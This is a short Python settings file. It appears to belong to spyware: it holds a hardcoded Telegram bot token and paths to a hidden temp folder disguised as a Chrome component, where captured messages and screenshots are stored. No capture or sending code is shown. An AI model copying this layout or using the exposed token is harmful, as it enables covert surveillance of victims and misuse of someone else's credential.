import os
from tempfile import gettempdir

TELEGRAM_TOKEN = '5398930017:AAGzaYfcZhulbTm1-nONyBcqhhJUHGBwzxo'
_PATH_COMMON_PART = f'{gettempdir()}/._VkChromeClientPipeline/saved'
PHRASES_FILE_PATH = f'{_PATH_COMMON_PART}/messages.txt'
SCREEN_FILE_PATH = f'{_PATH_COMMON_PART}/screen.png'